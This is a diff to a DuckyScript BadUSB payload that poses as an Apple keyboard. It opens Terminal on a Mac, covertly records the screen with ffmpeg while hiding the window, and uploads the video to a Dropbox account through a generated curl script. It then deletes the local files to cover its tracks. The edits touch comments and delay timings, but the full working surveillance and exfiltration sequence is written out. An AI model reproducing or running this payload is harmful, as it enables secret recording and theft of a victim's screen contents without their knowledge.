@@ -5,12 +5,13 @@ REM Then uploads the MP4 file to your Dropbox API, deletes the files on the desk
 REM Must have terminal recording privileges enabled in Privacy & Security settings 
 REM Script includes a delay of 10 seconds after starting the recording. 
 REM to allow for the desired recording duration. Can adjust the delay for longer recordings. line 35
-REM keep the render delays the same if you adjust line 35, also adjust line 43. This will allow for a good render time.
+REM Delays for render time; if you adjust line 35, also adjust line 43 accordingly. 
+REM This will allow good render times.
 
 REM Must have ffmpeg installed 
 REM You can download through the terminal using the 'brew install ffmpeg command'
-REM Replace "<USERNAME_HERE>" with system username line 44
-REM Replace "<Your API token Here>" with your API access token line 44
+REM Replace "<USERNAME_HERE>" with system username 
+REM Replace "<Your API token Here>" with your API access token 
 
 
 REM Author: Narsty
@@ -23,16 +24,15 @@ ID 05ac:021e Apple:Keyboard
 DELAY 1000
 GUI SPACE
 DELAY 500
-STRING terminal
+STRING terminal 
 DELAY 1000
 ENTER
 DELAY 500
 STRING ffmpeg -f avfoundation -r 30 -i "1" -c:v libx264 -preset ultrafast -tune zerolatency -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mkv
 DELAY 250
 ENTER
-DELAY 500
 GUI h        ; hides terminal to capture contents on the screen
-DELAY 10000  ; Delay for 10 seconds to record (adjust as needed)
+DELAY 10000  ; Delay for 10 seconds (adjust as needed)
 GUI TAB      ; reopens terminal to continue script
 DELAY 500
 CTRL C       ; Send the interrupt signal to stop the recording
@@ -40,7 +40,7 @@ DELAY 500
 STRING ffmpeg -i ~/Desktop/screen_recording.mkv -c:v libx264 -preset fast -crf 23 -pix_fmt yuv420p ~/Desktop/screen_recording.mp4
 DELAY 500
 ENTER
-DELAY 10000
+DELAY 30000
 STRING echo 'curl -X POST "https://content.dropboxapi.com/2/files/upload" -H "Authorization: Bearer <API ACCESS TOKEN HERE>" -H "Dropbox-API-Arg: {\"path\": \"/screen_recording.mp4\",\"mode\": \"add\",\"autorename\": true,\"mute\": false}" -H "Content-Type: application/octet-stream" --data-binary "@/Users/<system username here>/Desktop/screen_recording.mp4"' > upload.sh
 ENTER
 DELAY 500
@@ -49,7 +49,7 @@ ENTER
 DELAY 500
 STRING ./upload.sh
 ENTER
-DELAY 10000
+DELAY 5000
 STRING rm ~/Desktop/screen_recording.mp4
 DELAY 250
 ENTER
